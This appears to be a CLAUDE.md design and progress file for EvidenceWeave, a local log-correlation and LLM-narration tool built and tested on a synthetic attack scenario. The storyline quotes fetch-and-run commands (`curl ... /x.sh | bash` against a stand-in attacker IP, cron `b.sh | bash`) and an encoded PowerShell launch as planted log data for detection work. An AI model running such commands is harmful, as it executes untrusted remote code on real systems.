# EvidenceWeave — CLAUDE.md (single source of truth)

## Project overview
- EvidenceWeave is a log-correlation agent that reads mixed log sources (Linux auth.log, nginx/Apache access logs, Windows event logs as JSON).
- It normalizes them into one event schema.
- Deterministic correlation rules detect the attack chain.
- A local LLM (Ollama) writes an incident narrative where every sentence cites event IDs; a verifier checks those citations.
- Output is an HTML report, evaluated against a synthetic answer key.

## Hard constraints
- Completely free and local: Ollama only, no paid APIs.
- Python 3.10+.
- Minimal dependencies (requests, jinja2, pytest).
- Deterministic rules find the attack chain; the LLM only narrates.
- Every narrative claim must cite event IDs.

## Models
- Primary: `qwen2.5:7b-instruct` (override with env `EVIDENCEWEAVE_MODEL`).
- Secondary: `llama3.1:8b` (model comparison).
- Installed but unused: `qwen3-vl:8b-instruct`, `qwen3-vl:8b`. Do not pull any other models.

## Architecture
generator -> parsers -> normalized events -> correlation rules -> narrator -> verifier -> HTML report -> evaluation against the answer key

Package layout: `evidenceweave/{generator,parsers,correlation,narrator,verifier,report}`, plus `cli.py`, `schema.py`, `config.py`.

## Planned event schema
`event_id`, `timestamp` (UTC), `host`, `user`, `src_ip`, `source_type`, `action`, `raw_file`, `raw_line`, `raw_text`

## Attack storyline (implemented in Phase 1)
Attacker IP 203.0.113.45 throughout; compromised user `deploy`; new user `svc_backup`; pivot web01 = 10.0.0.5.
1. brute_force: 25-40 failed SSH passwords on web01 (invalid users, root, deploy)
2. initial_access: `Accepted password for deploy` from the attacker IP
3. privilege_escalation: `sudo ... curl -s http://203.0.113.45:8080/x.sh | bash`
4. persistence: `useradd` new user svc_backup + 4 CRON runs (`(svc_backup) CMD (curl ... b.sh | bash)`) in auth.log
5. lateral_movement (ws-fin01): 3-5x 4625, 4624 type 3 from 10.0.0.5, 4672, 4688 powershell `-Enc`, 4698 `\WindowsUpdateCheck`
6. web_recon: 26 nginx scan requests from the attacker IP (mostly 404, a few 200/403)
Steps 3/4/5 contain the attacker IP via the payload URL (no SSH IP exists on sudo/cron/Windows lines).

## Generator usage and answer key format
```powershell
python -m evidenceweave.cli generate --case case01 --difficulty easy --seed 42 [--out data/cases]
python -m evidenceweave.cli generate --case case02 --difficulty hard --seed 7
```
Output `data/cases/<case>/{logs/{linux_auth.log,nginx_access.log,windows_events.jsonl},answer_key.json,manifest.json}` (data/cases is gitignored; regenerate with the commands above).
`answer_key.json`: `case_name, seed, difficulty, attacker_ip, decoy_ips, compromised_user, created_user, clock_skew_seconds{source:sec}, time_note, steps[], benign_but_suspicious_looking[]`.
Each step: `step_id (1-6), name, description, start_time, end_time` (true UTC, ISO `...Z`), `status` (`complete` | `partially_unprovable`), `evidence[{source_file, line_number (1-based), event_marker}]`, `evidence_missing[{description, source_file, event_marker}]`.
Benign list items: `{source_file, line_number, event_marker, reason}`.
`manifest.json`: `case_name, seed, difficulty, generator_version, assumed_syslog_year (2026), line_counts, clock_skew_seconds`.
Hard mode: ~5x noise, decoy IP 198.51.100.23 (failed SSH + web scans, never succeeds), Windows clock +90s (logged = true + 90), useradd line for svc_backup deleted (step 4 partially unprovable), benign 4720 `temp_intern` and benign 4698 `GoogleUpdateTaskMachineCore`.
Line numbers are computed after merge/sort/deletion. Generator code: `evidenceweave/generator/{formats,attack,noise,key,core}.py`.

## Normalized event schema (Phase 2, `evidenceweave/schema.py`)
`Event` dataclass: `event_id, timestamp (tz-aware UTC, used for sorting), raw_timestamp (as written, UTC), clock_corrected (bool), host, user|None, src_ip|None, dst_ip|None, source_type (auth|nginx|windows), action, raw_file, raw_line (1-based), raw_text (unmodified), extra{}`. `to_dict()/from_dict()` round-trip exactly; timestamps serialize as ISO 8601 with `Z`. Event validates `action` and `source_type` on construction.
- **Event ID**: `AUTH-L<n>` (linux_auth.log), `NGX-L<n>` (nginx_access.log), `WIN-L<n>` (windows_events.jsonl); n = 1-based physical line number (blank lines count toward n).
- **Action taxonomy** (constants + `ACTIONS` in schema.py): ssh_login_failed, ssh_invalid_user, ssh_login_success, session_opened, session_closed, sudo_command, user_created, cron_session_opened, cron_session_closed, cron_command, web_request, win_logon_success, win_logon_failed, win_special_privileges, win_process_created, win_task_created, win_user_created, unparsed.
- **Field conventions**: auth `extra` has `program`, `pid`, plus `port`/`method` (ssh), `command`/`tty`/`pwd`/`target_user` (sudo), `service`/`uid`/`by` (session lines; for sudo sessions `user` is the target user e.g. root and `by` is the invoker), `new_user`/`uid` (useradd), `command` (cron). nginx `extra`: method, path, protocol, status, bytes, referrer, user_agent. windows `extra`: `event_id` + the whole EventData; user = TargetUserName (4624/4625/4720) or SubjectUserName (4672/4688/4698); src_ip = IpAddress unless `-`. `dst_ip` is currently always None.
- **Clock offsets**: never applied automatically. `--clock-offset HOST=SECONDS` = how far that host's clock is AHEAD of true time; `timestamp = raw_timestamp - SECONDS`, `clock_corrected=True` for that host's parsed events. Without the flag timestamp == raw_timestamp. Repeatable.
- **Unparsed**: unmatched lines / unknown EventIDs become `action="unparsed"` (reason in `extra.reason`, raw_text kept, counted). They inherit the previous event's timestamps in the same file (epoch if first) so they sort beside their neighbours. Blank lines are skipped and counted in `stats.blank`.
- **hosts.json** (written by the generator next to answer_key.json): `{"hosts": [{"name","ip","os":"linux|windows","role"}]}`. case: web01 10.0.0.5 linux role=web; ws-fin01 10.0.0.70 windows role=workstation. Optional for parsing; nginx host = first role=="web" host else "web01".
- **Sorting**: (timestamp, source order auth<nginx<windows, raw_line).
- **Parse CLI**: `python -m evidenceweave.cli parse --case-dir data/cases/case02 [--clock-offset ws-fin01=+90] [--year 2026] [--out output]` -> `output/<case>/events.jsonl` + summary. Year defaults to manifest `assumed_syslog_year`. Bad offsets exit 2 with a clear message.
- Code: `evidenceweave/parsers/{common,auth_parser,nginx_parser,windows_parser,pipeline}.py`; `parse_case(case_dir, year=None, clock_offsets=None) -> Case`, `write_events(case, path)`.

## Correlation and attack chain (Phase 3, `evidenceweave/correlation/`)
**Anti-overfitting rule: the analysis never reads `answer_key.json` or manifest attack info and hard-codes no IPs, user names, URLs or file names.** Inputs are only the parsed events, `hosts.json` and CLI options. Only `scripts/check_against_key.py` and tests may read the key (a test greps `correlation/` for "answer_key"/"manifest" and another proves chain.json is byte-identical with the key and manifest deleted). Attacker, compromised user, payload server, pivot host are all DERIVED.
- **Config** (`config.py`, `CorrelationConfig`; every int/float overridable on the CLI as `--field-name`, plus `--tolerance-seconds`): brute_force_min_failures=8, brute_force_window_seconds=600, access_after_failures_window_seconds=1800, web_recon_min_requests=15, web_recon_min_error_ratio=0.6 (403/404 share), web_recon_window_seconds=900, web_recon_min_sensitive_paths=3, cross_host_tolerance_seconds=300, lateral_window_seconds=900, sudo_after_access_window_seconds=1800, cron_session_match_seconds=60, sensitive_path_fragments (/.env /.git /wp-admin /wp-login /phpmyadmin /admin /backup /config /server-status /cgi-bin), suspicious_patterns (compiled regex list `DEFAULT_SUSPICIOUS_PATTERNS`; extend it there).
- **Tolerance semantics**: across different hosts accept `B.start >= A.start - tolerance`; same host is strict. Skew is deliberately not estimated.
- **Finding** (`findings.py`): `finding_id (F-<rule>-<n>, time order), rule, stage (brute_force|initial_access|privilege_escalation|persistence|lateral_movement|web_recon|missing_evidence), status (confirmed|attempts_only|partial|unprovable), start_time, end_time (UTC, corrected timestamps), hosts, entities{ips,users,hosts,urls}, evidence_event_ids (sorted by source,line), summary (template text), details{}`; `to_dict/from_dict`.
- **Rules** (`rules/*.py`, `run(events, cfg, hosts, prior_findings)`; order brute_force, initial_access, privilege_escalation, lateral_movement, persistence, web_recon; unparsed events are skipped and counted): 1 brute_force = >=N failed ssh/4625 from one IP in a sliding window, merged bursts, confirmed only if a success follows (within the access window); 2 initial_access = success from an IP whose brute force ended within the window (windows logons only from non-inventory IPs); 3 privilege_escalation = sudo with a suspicious pattern by a compromised user or with a URL, or any sudo by a compromised user within the post-access window (partial); 4 persistence = (a) user_created after an initial access, (b) suspicious/URL cron commands grouped per (host,user,command) with matching session open/close lines (same pid+user, within 60s), (c) suspicious win_task_created not already explained by lateral movement; plus a missing_evidence/unprovable finding when a cron user was never created in the logs but first appears after the initial access; 5 lateral_movement = win logon type 3/10 whose src IP is an inventory host that has an initial_access/privesc finding, with preceding 4625s from that IP and, for the same user within 900s, 4672 / suspicious 4688 / 4698 (without hosts.json only a candidate with a suspicious process, status partial, details.note explains the missing inventory); 6 web_recon = per IP, >=15 requests with >=60% 403/404 in 15 min, or >=3 distinct sensitive paths; emits attempts_only.
- **Chain** (`chain.py`): seed attacker IPs/users/hosts from initial_access findings, then fixpoint-grow: a finding joins if it shares a payload server (URL origin), IP, a pivot host IP (inventory ip of an attacker host) or a user with the set AND, for post-access stages, passes the time-order check vs the first initial access (cross-host tolerance). Hosts alone never link. Linked web_recon is upgraded to confirmed. Lateral movement without a verified pivot is never linked. `chain.json`: `case_name, generated_by_version, config, applied_clock_offsets, attacker_entities{ips,users,associated_users,hosts,urls}, stages[{stage,status,start_time,end_time,finding_ids,evidence_event_ids,links[{finding_id,reasons}]}], attempts_only_actors, unlinked_findings, unprovable_items, notes, stats`. missing_evidence attaches to its `affects_stage` (persistence) which becomes `partial`. IPs with brute force/recon but no successful access go to `attempts_only_actors` (never in a stage).
- **Usage**: `python -m evidenceweave.cli correlate --case-dir data/cases/case02 [--clock-offset ws-fin01=+90] [--tolerance-seconds 300] [--year 2026] [--out output] [--brute-force-min-failures N ...]` -> `output/<case>/{findings,chain}.json` + summary. Measure: `python scripts/check_against_key.py --case-dir data/cases/case02 [--chain output/case02/chain.json]` (always exit 0).

## Answer-key fix (Phase 4, Part A)
The planted cron job's `pam_unix(cron:session): session closed for user <cron user>` lines are now tagged as step 4 evidence (marker `CRON[<pid>]: pam_unix(cron:session): session closed`), in `generator/attack.py`. Logs, manifest.json and hosts.json are byte-identical to before (hashes asserted in `tests/test_generator.py`); only answer_key.json changed: +4 step-4 evidence items per case (case01 13, case02 12). Correlation precision is now 1.000 / recall 1.000 on both cases.

## Narrator (Phase 4, `evidenceweave/narrator/`)
The LLM only EXPLAINS the Phase 3 chain; it never decides what the attack is, and it never sees the answer key (a test scans all non-generator modules for the string `answer_key`).
- **llm.py**: `LLMClient` Protocol (`model`, `options`, `json_mode`, `complete(system,user)->LLMResult`); `OllamaClient` (requests, `/api/chat`, stream false, `keep_alive` 10m, options temperature 0 / seed 42 / num_ctx 8192 default). Output format = JSON schema `{"sentences":[{"text","cites":[...]}]}`; if the server rejects it, falls back (sticky) to `format:"json"`; `json_mode` is recorded in outputs. Bad/malformed replies return a failure result (never raise); only an unreachable server (`ollama serve`) or missing model (`ollama pull <model>`) raises `LLMError`. `call_json` retries ONCE, only for unparseable replies (same prompt + reminder line).
- **packs.py**: per chain stage a `Pack` (status, times, deterministic finding summaries, entities, integer counts, NOT-PROVABLE notes, evidence lines `ID | timestamp | raw_text<=300 chars`). Evidence capped at `max_evidence_per_stage` (default 12) with a deterministic spread (first, last, evenly spaced; chronological). `allowed_cite_ids` = exactly the IDs shown; `full_evidence_ids` = all stage IDs; omitted counts recorded.
- **prompts.py** (`PROMPT_VERSION = "p4-v1"`, stored in outputs): strict system rules (only given facts, every sentence cites, cite only allowed IDs, never invent, say "not shown", no speculation, 2-5 sentences, copy times/IDs exactly, don't mention instructions); stage prompt; executive-summary prompt (per stage: status, time range, summaries, first/last shown ID); baseline chunk and final prompts.
- **narrate.py** `narrate_chain(case_output_dir, client, config)`: one call per stage chronologically + one executive-summary call; citation problems are NOT repaired (Phase 5). Deterministic template sentences (`source: "template"`) for every `attempts_only_actors` entry ("<IP> made N failed login attempts / web requests between t1 and t2; no successful access from this address was observed", cites first/middle/last) and every `unprovable_items` entry (what could not be proven + indirect evidence, cites first 4). No LLM call for these.
- **baseline.py** `run_baseline(...)`: no rules/chain/key; the sorted events.jsonl is split into consecutive chunks (default 120), each chunk -> LLM notes (same schema, same temperature/seed/model, rules forbidding invention + requiring cites), then one final call turns all notes into a 6-12 sentence chronological narrative. A size guard refuses (before any call) a chunk whose estimated tokens exceed 85% of num_ctx. NOTE: 120-event chunks are ~8-9k tokens, so run the baseline with `--num-ctx 16384`.
- **Outputs** in `output/<case>/`: `narrative.json` (case_name, mode "chain", model, prompt_version, ollama_options, json_mode, total_seconds, created_at, executive_summary + executive_summary_meta, stages[{stage,status,source "llm",sentences,parse_ok,attempts,seconds,evidence_shown,evidence_total,allowed_cite_ids,raw_output_file}], attempts_only, unprovable, stats{calls,failed_parses,retries,total_tokens}); `baseline_narrative.json` (mode "baseline", chunk_size, number_of_chunks, chunks[...], collected_notes, final, sentences, failed_parses, retries, total_seconds, stats); `narrator_raw/<mode>_<model-with-colons-replaced>/<stage|chunk_NNN|final|executive_summary>.txt` holding the exact prompts and every raw reply.
- **CLI**: `python -m evidenceweave.cli narrate --case-dir data/cases/case01 [--mode chain|baseline|both] [--model NAME] [--max-evidence-per-stage 12] [--chunk-size 120] [--num-ctx 8192] [--clock-offset HOST=SECONDS] [--tolerance-seconds 300] [--year 2026] [--out output]`. If chain.json/findings.json/events.jsonl are missing in the output folder (or any of clock-offset/tolerance/year is given) it runs parse + correlate first. Model default: env `EVIDENCEWEAVE_MODEL` or qwen2.5:7b-instruct.

## Verifier and repair loop (Phase 5, `evidenceweave/verifier/`)
Every narrative sentence is either VERIFIED or visibly absent. The verifier never reads the answer key and hard-codes nothing from the generated cases (tests check both statically; `verifier/` must not import the generator).
- **Layers** (per sentence, in order; `verdicts.py` holds `SentenceVerdict` + failure codes): (1) `structure.py` normalizes (markdown, junk characters, stray quote runs, doubled stops - recorded as informational `NORMALIZED`), moves allowed inline event IDs into `cites_final` (removing them and leftover brackets/"cites" words from the text), and fails on `EMPTY_TEXT`, `NO_CITES`, `CITE_UNKNOWN_ID` (checked first), `CITE_NOT_ALLOWED`, `INLINE_ID_NOT_ALLOWED`, `TOO_MANY_CITES` (default max 8). (2) `entities.py` grounds IPs (`MALFORMED_IP` for IP-like tokens with 3-5 dotted groups that are not valid IPv4, else `IP_NOT_GROUNDED`), times (`TIME_NOT_GROUNDED`, to the second, ISO and HH:MM:SS, timestamp and raw_timestamp), numbers (`NUMBER_NOT_GROUNDED`; 0/1, number words and digits glued inside words are ignored), URLs/domains, users (`USER_NOT_GROUNDED`), hosts from hosts.json, and quoted/backticked strings >6 chars (`COMMAND_NOT_GROUNDED`). Stage sentences are grounded in the CITED events only plus stage-level facts for times and numbers (stage range, duration in s and rounded min, ints from finding details and summaries, evidence_shown/total, number of cites, seconds->minutes conversions); the executive summary additionally in the union of all stage facts and entity lists; template sentences in all evidence of their finding. (3a) `semantics.py`: `CLAIM_TABLE` (list of (name, regex, supporting actions), extensible at runtime) - a matched phrase needs at least one cited event whose action is in its set, else `SEMANTIC_MISMATCH`; skipped when negated within 3 words; URLs and quoted commands are masked first; not applied to template sentences. (3b) `judge.py`: independent LLM judge (default llama3.1:8b, temperature 0, seed 42, num_ctx 8192, JSON schema {verdict supported|partial|unsupported, reason}); sees ONLY the normalized sentence + the cited events' `ID | timestamp | raw_text` (max 12, first/last/evenly spaced, omitted count stated) + for executive-summary sentences the deterministic stage summaries; runs only on sentences that passed layers 1-3a; unparseable reply retried once then `judge_error`. Accepted = all deterministic layers pass AND judge == supported (`JUDGE_PARTIAL`/`JUDGE_UNSUPPORTED`/`JUDGE_ERROR` are rejections). `judge_independent=false` plus a loud warning when judge model == narrator model. `--no-judge` = deterministic layers only (accepted = layers pass; report says `deterministic_only`).
- **Repair loop** (`repair.py`, batched rounds so Ollama swaps models rarely): round 0 verifies the existing narrative.json (attempt 0) deterministically, then the judge on all survivors together. Each repair round 1..max_retries (default 2): narrator calls for ALL failing units first (feedback block appended to the user prompt via `narrate_stage/narrate_summary(..., feedback)`: each failed sentence with its codes in plain words), deterministic layers, then the judge for all survivors together. The executive summary is a unit in the same rounds (its prompt does not depend on stage text, so it does not wait for the stages). Per unit the best attempt (most accepted sentences, ties earliest) wins; only its accepted sentences are kept; a unit with zero accepted sentences gets deterministic template text (finding summaries citing first/last allowed IDs; executive summary = one sentence per stage), verified with layers 1+2 only (semantics skipped because 2 cites cannot show every claim in a summary). Template sections (attempts_only, unprovable) get layers 1+2 only, no judge, never dropped; a failing one is a bug, printed loudly and listed in the report. Dispositions: `kept`, `dropped` (unaccepted or superseded attempts), `replaced_by_fallback`.
- **Outputs** in `output/<case>/`: `narrative_verified.json` (narrative.json structure + `verification` block; only accepted sentences, each with `source` llm|template|template_fallback and `attempt`), `verification_report.json` (every SentenceVerdict of every attempt, `call_log`, per-attempt feedback, summary with per-layer pass counts, failure-code histogram, judge verdict counts, sentences reaching the judge, drops, repair calls, fallbacks, seconds per phase, model swaps, before/after supported-rate, attempt-0 ablation deterministic-only vs with-judge), `baseline_verification.json`, `corruption_report.json`.
- **Baseline verification**: same layers + judge on baseline_narrative.json sentences, verdicts only (no repair, no drop); reports supported-rate, rate excluding sentences whose only failure is TOO_MANY_CITES, and coverage of the chain's attacker entities (attacker IP, compromised user, payload host, pivot host - derived from chain.json/findings.json) in the final text, next to the chain narrator's attempt-0 and final numbers.
- **Corruption test** (`corruption.py`, seed 42, cap 70): 11 deterministic corruption types (ip_digit_drop, ip_swap, time_shift, number_change, username_swap, cite_nonexistent, cite_foreign_stage, cite_wrong_event, fabricated_entity, fabricated_claim_no_entity, cite_padding) applied one at a time to the ACCEPTED LLM sentences, selected round-robin across types; the full verifier (with the real judge) runs on every sample and on every clean base sentence as a control.
- **CLI**: `python -m evidenceweave.cli verify --case-dir data/cases/case01 [--mode chain|baseline|corruption|all] [--model NARRATOR] [--judge-model llama3.1:8b] [--max-retries 2] [--max-cites 8] [--no-judge] [--num-ctx 16384] [--max-evidence-per-stage 12] [--chunk-size 120] [--clock-offset ..] [--tolerance-seconds ..] [--year ..] [--out output]`. Re-narrates first if narrative.json is missing, lacks allowed_cite_ids, or `--model` differs from the recorded model.

## Phase 5b: fact-sheet narration, hardened judge, reproducibility
Part 0 diagnosis is in `output/diagnosis_phase5b.md` (made by `scripts/make_diagnosis.py`, verdicts assigned by hand): 47 failing Phase 5 LLM sentences = 33 PROMPT_DESIGN_PROBLEM, 10 GENUINE_NARRATOR_ERROR, 4 VERIFIER_TOO_STRICT. Only verifier loosening: `win_task_created` counts as support for "process/command" phrases (`semantics.py`). Also found/fixed a stale `events.jsonl` (clock-corrected Windows times vs raw `chain.json`): `pipeline_meta.json` now stores offsets/tolerance/year.
- **Facts mode (CLI default; library default stays raw)**: `narrator/facts.py` `build_facts(chain, findings, events, max_facts=8)` makes deterministic, self-provable atomic facts per stage `{fact_id "<stage>-F<n>", text, cites<=8, kind}` (kinds by priority time_window<actor<key_action<count<link<status, shown chronologically). Counts are exact only if every counted event is cited, else "At least k". Prompts `p5b-facts-v1` (`PROMPT_VERSION_FACTS`); sentences carry `fact_ids`; cites must be a subset of the referenced facts' cites. New codes `FACT_ID_UNKNOWN`, `CITES_NOT_FROM_FACTS`, `NO_FACT_REFERENCE`, also `DANGLING_ENDING`, `JUDGE_QUOTE_INVALID`, `JUDGE_DISAGREE`. Fallback = facts verbatim. Report has a fact-coverage block. Raw mode (`p4-v1`) stays available (`--narration-mode raw`).
- **Judge `p5b-claims-v2`** (`ClaimJudge`): claims with ONE exact quote each (found in the shown raw_text or ISO timestamp); verdict derived in code; run twice (second seed 43) and both must be supported else `JUDGE_DISAGREE`; `--single-judge`; independence warning; timeout 300s, num_predict 900. Windows EventID legend in the judge system prompt.
- **Repair**: seed 42+round, temperature 0.3, sentence-level feedback, accepted sentences frozen, repair-effectiveness block.
- **Bug fixes**: quote-balanced normalization (only excess closing quotes removed); dangling endings ("as shown by") removed or `DANGLING_ENDING`.
- **Reproducibility**: `run_metadata` (models, Ollama version/digests, options, prompt versions, git hash, mode) in 5 output files; `--repeat N` -> `output/<case>/runs/<mode>_run<k>/` + `repeat_summary.json` (values/mean/min/max computed from each run's own files). Code: `evidenceweave/runmeta.py`, `verifier/runner.py`.
- **Corruption**: >=10 no-entity fake claims, controls go through the double judge, three-way split (deterministic / judge-only / missed).
- **CLI**: `verify --narration-mode facts|raw --max-facts-per-stage 8 --single-judge --repeat N --repair-temperature 0.3`.
- Live suite driver: `run_live_5b.sh`; report printer: `scripts/phase5b_report.py`; logs `live5b/`.

## Phase 6a: analyze, report, docs
- **Fixes**: (A1) `PATH_NOT_GROUNDED` in `verifier/entities.py` (`extract_paths`: POSIX paths with leading slash after start/whitespace/quote/bracket/~ and >=2 segments or an extension, Windows `C:\...`, bare names with ext tar gz zip sh py exe dll ps1 bat txt log conf cfg db sql php bak key pem json xml; and/or, dates, URLs, event/fact IDs excluded; pool = cited events + referenced fact text + event file names). `scripts/path_regression.py` re-checks saved accepted sentences with no LLM: 176 rechecked, 0 fail. (A2) `NarratorConfig.mode` library default is now `facts`; old tests pass `mode="raw"` explicitly. (A3) `schema.format_ts(dt)` = `YYYY-MM-DDTHH:MM:SSZ` for display only; stored formats unchanged.
- **`analyze`**: `python -m evidenceweave.cli analyze --case-dir D [--no-llm] [--model] [--judge-model] [--narration-mode facts|raw] [--max-facts-per-stage 8] [--max-retries 2] [--max-cites 8] [--single-judge] [--num-ctx 16384] [--clock-offset H=S] [--tolerance-seconds N] [--year Y] [--reuse] [--out output] [--no-open]` (`evidenceweave/analyze.py`). Phases: parse+correlate, narrate, verify+repair, report, one timed line each. `--reuse` skips narrate+verify when narrative_verified.json and verification_report.json are newer than chain.json (and not from --no-llm). Ollama preflight (`check_models`) and any LLMError print the exact fix command plus the `--no-llm` hint. `--no-llm` (`verifier/deterministic.py`): no client built; facts verbatim, one sentence per fact in priority order, layers 1/facts/2/3a, source `deterministic`, `verification.no_llm=true`, banner in the report.
- **`report`**: `report --case-dir D [--out] [--no-open]` rebuilds `output/<case>/report.html` from existing files only; without narrative_verified.json it shows chain + facts with a notice. Opens the browser via `webbrowser` unless `--no-open` (never fails).
- **Report** (`evidenceweave/report/{build,render}.py`, `template.html`): one offline file, inline CSS/JS, no framework, no external references, no links. jinja2 autoescape for all text; data embedded as JSON with `<`, `>`, `&` escaped (`<` ...); JS uses textContent only. Jinja comment delimiters are `<<# #>>` (CSS `{#drawer` clashes). Sections: header (mode banners, deterministic verdict from chain counts), summary strip, timeline (positioned bars, status text+icon+pattern, attempts-only lane dashed), executive summary, stage cards (facts | verified sentences with badges LLM + verified / deterministic / template), evidence drawer (raw line, file:line, corrected+logged time, +-3 context lines, Esc, copy id, focus return), attempts-only, could-not-prove, method+limits (details, expanded for print), footer (tool version, git, "synthetic" only if manifest has `synthetic` or `generator_version`; answer key never read). Deterministic given `generated_at`.
- **Docs/demo**: `README.md`, `docs/DEMO.md` (timed 7 min script, backup plan, checklist, 12 questions, Results placeholder for 6b), `scripts/demo.ps1 [-NoLlm] [-Case] [-Seed]`, `docs/demo/sample_report_case02{,_no_llm}.html`.

## Phase plan
- [x] Phase 0 Setup
- [x] Phase 1 Synthetic log generator + answer key
- [x] Phase 2 Parsers + normalized schema
- [x] Phase 3 Correlation rules
- [x] Phase 4 LLM narrator with citations (+ naive baseline)
- [x] Phase 5 Citation verifier + retry loop
- [x] Phase 5b Fact-sheet narration, hardened judge, reproducibility
- [x] Phase 6a analyze command, HTML report, docs + demo kit
- [ ] Phase 6b multi-case evaluation, held-out corruption pool, manual audit (remaining)

## Working rules (Claude Code)
- Work on one phase at a time; never start the next phase until the user says so.
- At the end of every phase update this file: tick the phase, add a progress log entry (date, what was built, files created, test results, decisions/problems).
- Keep the "Decisions" and "Open issues" sections current.
- Run tests before finishing a phase.

## Decisions
- venv built from the standard Windows Python 3.12 (`%LOCALAPPDATA%\Programs\Python\Python312`), not the MSYS2 `python` on PATH, which creates a non-standard `.venv/bin` layout without `Scripts\Activate.ps1`.

## Open issues
- (Phase 6a) Live case02 run: only 15 of 27 first-pass+repair sentences accepted, judge agreement 0.80; the report is correct but plain. Badge tooltips list the checks generically, not per verdict. Report timeline uses one row per stage; no search box.
- (Phase 5b, measured) Judge protocol limits: an aggregate claim ("4 failed logons", "ran 4 times") cannot be backed by ONE quote, so it is structurally rejected (JUDGE_QUOTE_INVALID/PARTIAL); relational words ("preceded", "over the network", "was recorded") are marked "not shown". The status fact cannot be proven by the judge.
- (Phase 5b) llama3.1:8b is unreliable and only partly reproducible: judge_agreement 0.92-0.96 (case01), 0.80 (case02); JUDGE_DISAGREE 4 / 12 sentences; ~60 sentences per run where the judge's own verdict differs from the code-derived one. Seed 43 at temperature 0 gives little independence.
- (Phase 5b) Facts narration is thin and repetitive ("An event in this stage was logged at T"), fact coverage only 0.48-0.50; case01 lateral_movement ended with a single "Events were logged from..." sentence. Facts runs are near-identical across the 3 repeats (temperature 0 / fixed seed), so min/max show little variance; case02 was identical in all three.
- (Phase 5b) Corruption: fabricated_entity missed 2/8 per run on case01 (persistence/brute_force sentence + invented path); fabricated_claim_no_entity missed 1/8 on case01, 0 on case02. False rejection of clean controls 1/12 (case01, JUDGE_PARTIAL on a sudo command) and 1/15 (case02, JUDGE_QUOTE_INVALID + DISAGREE).
- (Phase 5, measured) The 7B narrator mostly IGNORES repair feedback at temperature 0: identical or near-identical sentences come back, so repair rounds recover little (case01: 3/10 -> 4/10 accepted; 3 of 7 units ended as template fallbacks). Many rejections are the semantic layer (e.g. a claim about failed logins in a stage whose allowed events are only the success event) - the narrator cannot satisfy them by citing differently.
- Normalization is lossy: stripping a quote run also deleted a command's legitimate closing quote, and removing inline IDs can leave dangling phrases ("... as shown by.") that the judge still accepts (seen in the case02 executive summary).
- The judge (llama3.1:8b) is unreliable for appended claims with no checkable entity: in the first live run it accepted 4/4 `fabricated_claim_no_entity` corruptions, in an identical second run it caught 2/4 (Ollama output was not reproducible across runs even at temperature 0, seed 42). Deterministic layers cannot catch entity-free fabrications.
- The corruption sample is small: only 4 accepted clean LLM sentences exist for case01, so 27 corrupted samples (cap 70 not reached); number_change and cite_padding were not applicable. Treat the catch rate as indicative.
- `USER_NOT_GROUNDED` is heuristic (a word after "user"/"account"/"as"); a suffix rule (-ed/-ing/-ly, len>=5, unquoted) and a stoplist avoid prose, but unusual verbs can still false-positive and invented plain-word names without a trigger word are not seen.
- 2-group dotted numbers are decimals, not IP-like (the spec said 2-5 groups); the judge is conservative (partial = rejected), e.g. "20 minutes after initial access" is rejected because the cited line alone does not show it.
- (Phase 5 input) Live qwen2.5:7b-instruct output contains defects the verifier must catch: an IP copied wrongly (`203.0113.45` instead of 203.0.113.45), stray junk characters in a sentence, a plain 4624 logon described as a "privileged logon", event IDs written inline in the text as well as in `cites`. Cites were all inside the allowed list this time, but claims are not checked against the cited events.
- The baseline needs `--num-ctx 16384` for 120-event chunks; the chain narrator is run with the same options for a fair comparison.
- Template attempts-only wording only knows failed-login / web-request findings; other actor stages fall back to "N events".
- Persistence evidence includes the cron `session closed` lines (as specified); the key only tags `session opened` + CMD, so check_against_key shows 4 "extra" lines per case (precision 0.67-0.69 on step 4). Genuinely part of the cron run, not a rule gap.
- missing_evidence needs an initial_access finding (a user predating the compromise is never reported missing); with no recorded access nothing is reported.
- Chain linking by user can over-link if a compromised user also has unrelated flagged activity; hosts never link on their own.
- Persistence (a) flags any account created after access (e.g. the benign 4720); it stays out of the chain only because it shares no entity.
- Rules were validated on 8 generated cases (seeds 42, 7, 1, 2, 3 x easy/hard); `burst_spans` tests only the maximal window per start (see its ponytail note).
- Chain timestamps from Windows keep millisecond precision (`...:44.510000Z`), others print whole seconds.
- Syslog year handling is a single fixed year: a log spanning New Year would mis-date January lines (fine for the synthetic cases).
- ws-fin01's IP (10.0.0.70) in hosts.json is invented for the inventory; no log line contains it. Phase 3 still links hosts via the pivot IP 10.0.0.5.
- Unparsed events borrow the previous event's timestamp (an approximation, flagged by action=unparsed).
- Windows evidence in step 5 carries 10.0.0.5 (web01), not the external attacker IP; the attacker IP only appears via the 4698 task URL. Phase 3 rules must link the hosts through the pivot IP.
- Step times in the key are true UTC; Windows skew is NOT auto-corrected (opt-in via --clock-offset). Phase 3 must decide how to obtain the offset (user-supplied) rather than assume it.

## Progress log
### Phase 0 — 2026-10-27
- Built: folder structure, venv, requirements.txt, .gitignore, config.py, schema.py (dataclass placeholder), CLI with placeholder subcommands, scripts/check_ollama.py, smoke tests.
- Files: `evidenceweave/{__init__,cli,schema,config}.py`, subpackage `__init__.py` files, `scripts/check_ollama.py`, `tests/test_smoke.py`, `requirements.txt`, `.gitignore`, `data/.gitkeep`, `CLAUDE.md`.
- check_ollama: qwen2.5:7b-instruct replied in 5.6s, llama3.1:8b in 11.1s (includes model load).
- Tests: see commit; smoke tests pass.

### Phase 1 — 2026-10-27
- Built: seeded generator (easy/hard), answer key + manifest, `generate` CLI command.
- Files: `evidenceweave/generator/{formats,attack,noise,key,core}.py`, `evidenceweave/cli.py` (generate), `tests/test_generator.py`.
- Cases: case01 easy seed 42 (265/426/96 lines, 81 evidence); case02 hard seed 7 (1111/2338/458 lines, 75 evidence, 1 missing).
- Tests: 13 passed (11 generator + 2 smoke).
- Decisions: independent `random.Random(f"{seed}/{part}")` streams; sudo/cron attack lines carry the attacker IP via payload URL; useradd runs in root shell so no sudo line leaks it; evidence_missing items are objects (description + marker) so tests can verify absence; generated cases not committed.
- Problems: first marker for cron session lines matched open+close lines; fixed by including "session opened".

### Phase 2 — 2026-10-27
- Built: normalized `Event` schema + action taxonomy, three parsers with a shared no-silent-drop line loop, `parse_case`/`write_events`, `parse` CLI with `--clock-offset`, generator now also writes `hosts.json`.
- Files: `evidenceweave/schema.py`, `evidenceweave/parsers/{common,auth_parser,nginx_parser,windows_parser,pipeline}.py`, `evidenceweave/cli.py`, `evidenceweave/generator/{formats,core}.py` (hosts.json), `tests/test_parsers.py`.
